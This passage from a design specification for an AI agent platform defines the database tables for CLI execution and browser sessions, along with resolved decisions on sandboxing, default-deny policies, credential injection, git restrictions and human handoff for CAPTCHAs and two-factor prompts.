  reason              text not null,       -- captcha, two_factor, payment, agent_request
  agent_description   text,               -- what the agent needs the human to do
  page_url            text not null,       -- URL at handoff time
  screenshot_artifact_id uuid,            -- screenshot at handoff time
  status              text not null default 'pending',  -- pending, in_progress, completed, expired
  human_completed_at  timestamptz,
  post_handoff_screenshot_id uuid,        -- screenshot after human completed
  expires_at          timestamptz,
  created_at          timestamptz not null default now(),
  metadata            jsonb
);

create index on browser_handoff (browser_session_id);
create index on browser_handoff (status) where status in ('pending', 'in_progress');
```

### Relationship to Control Plane Schema

These tables extend, not duplicate, the control plane's execution tracking:

- `cli_execution` and `browser_action` both reference `run_id` and `run_step_id` from the control plane's Run/RunStep entities. They add domain-specific detail that doesn't belong in the generic execution schema.
- RunArtifacts (doc 16) are the storage records for screenshots, CLI output, and other produced files. The domain tables reference them by ID.
- `browser_session` is a long-lived entity that spans multiple runs — it is not tied to a single run but to a task. The control plane's run-scoped model doesn't cover this, so it needs its own table.

### Design Notes

- **4 tables** for the system integration domain.
- `cli_execution` captures the full lifecycle of each command — from policy evaluation through execution to output. This complements the control plane's generic RunStep with CLI-specific detail (command string, exit code, risk level, network policy).
- `browser_session` is task-scoped, not run-scoped. This reflects the reuse decision: the browser persists across runs within a task.
- `browser_action` is the fine-grained record of every browser interaction. Each action references its browser session (for session context) and its run/run step (for control plane linkage).
- `browser_handoff` tracks the human handoff lifecycle. It references both the browser session and the inbox item, bridging the browser domain with the task domain's inbox.
- `env_vars` on `cli_execution` stores only the keys of environment variables set, never the values. Values are resolved from the secret store at runtime and never persisted in execution records.

---

## Integration with Other Specs

- **Chat (doc 02)**: CLI and browser tools are tier 2 tools in the turn loop. They route through the control plane for policy evaluation and execution. Tool call/result messages in chat reference the underlying cli_execution or browser_action records.
- **Projects/tasks (doc 03)**: CLI commands run in the project's git repo, on the agent's task branch. Browser sessions are scoped to tasks.
- **Shipping (doc 03a)**: deploy tasks use CLI (run deploy scripts, build commands) and browser (submit to Kindle Store, interact with hosting platforms) for delivery actions. Same execution model.
- **Agents (doc 05)**: agent profiles include tool policy that determines which system tools an agent can access. A content writer might have browser capabilities (`system.browser.navigate`, `.interact`, `.screenshot`, `.extract`) but not `system.cli.execute`.
- **Control plane (doc 16)**: the authoritative policy and execution layer. All CLI and browser actions pass through the broker. Run/RunStep/RunArtifact/RunEvent entities provide the generic execution framework that this spec's domain tables extend.
- **Tools (doc 20)**: CLI tools (`cli.execute`) and browser tools (`browser.navigate`, `browser.click`, etc.) are registered in the tool registry as tier 2 system tools. Tool descriptions are included in prompt assembly (layer 7).
- **Security/observability (doc 13)**: CLI and browser execution data feeds into observability dashboards (action counts, failure rates, execution times). Secret references in credential injection follow doc 13's security baseline.

---

## Resolved Decisions

1. **Browser sessions are reusable per task, not per run.** Multiple runs within a task share the browser context (cookies, login state, history). This enables multi-step workflows that span multiple agent runs. Sessions are cleaned up when the task completes.
2. **CLI sandbox model is process-level isolation with restricted working directory and environment.** Container-level isolation (each command in a lightweight container) is a future enhancement for managed multi-tenant deployments. Process isolation is sufficient for single-operator self-hosted deployments.
3. **Sensitive actions are denied by default.** Commands matching the denylist are denied. Browser actions on sensitive domains (financial, auth, admin) are denied by default — the org or project can allowlist specific domains. Policy is binary: allow or deny, configured in advance. Human handoff for browser actions (CAPTCHA, 2FA) is agent-initiated, not policy-triggered.
4. **Browser action API is high-level.** Agents use structured actions (`navigate`, `click`, `type`, `screenshot`, `extract_text`, `extract_structured`, `wait_for`), not raw browser automation code. This keeps prompts clean, actions auditable, and sandboxing enforceable.
5. **Compound CLI commands are decomposed for classification.** Pipes, chains, and subshells are broken down, and the overall risk is the maximum of all components. This prevents policy bypass via command chaining.
6. **Automatic screenshots after every browser action.** Stored as RunArtifacts for human review, NOT returned inline to the agent (to avoid wasting tokens). The agent explicitly calls `browser.screenshot()` when it needs to see the page.
7. **Agents never see credentials in prompts.** Credentials are injected into browser contexts and CLI environments at execution time by the worker, resolved from the org's secret store. The agent's tool call history and audit trail never contain raw secrets.
8. **Network policy for CLI is configurable per project**: `allow_all`, `deny_all`, or `allowlist`. Default is `allow_all` for self-hosted.
9. **CLI output is truncated in tool results with full output in RunArtifacts.** Inline limit defaults to 50KB per stream. Total capture limit defaults to 10MB per command. The agent is told when output is truncated and given an artifact reference.
10. **One active browser session per task.** Multi-tab support is deferred. The agent navigates between sites within a single session. Simplifies state management and prevents resource exhaustion.
11. **Human handoff creates an inbox item.** The human completes the sensitive action manually and signals completion. Handoffs expire after a configurable timeout (default 24 hours). No back-and-forth during a handoff — discussion happens in the task's sync session.
12. **Git operations are regular CLI tool calls with policy rules.** No push to `main` (merge queue only), no force push to shared branches (main, develop, release/*) — force-pushing to the agent's own task branch is allowed when push is enabled. No branch deletion. Read-only access to any branch. Commits linked to runs via RunEvent metadata.
13. **CLI retries are not automatic.** Commands may have side effects, so the agent must explicitly choose to re-run. Projects can mark specific commands as idempotent for single automatic retry on transient failure.
14. **Risk classification has four levels**: `safe`, `normal`, `sensitive`, `dangerous`. Each level maps to a default policy action. Classification follows the policy layer hierarchy (instance > org > project > agent), where lower layers can only restrict, not loosen.
15. **CLI and browser domain tables extend the control plane schema.** They reference Run/RunStep/RunArtifact by ID and add domain-specific detail (command strings, exit codes, page URLs, screenshots). They do not duplicate generic execution tracking.
16. **Browser session idle timeout defaults to 1 hour.** Active sessions with no browser actions for this duration are cleaned up. Prevents zombie browser processes.
17. **Revocation is immediate.** The human can revoke `system.cli.execute` or all `system.browser.*` capabilities at any time. In-flight operations finish, subsequent attempts return "not permitted."

## Open Questions

_None currently outstanding._
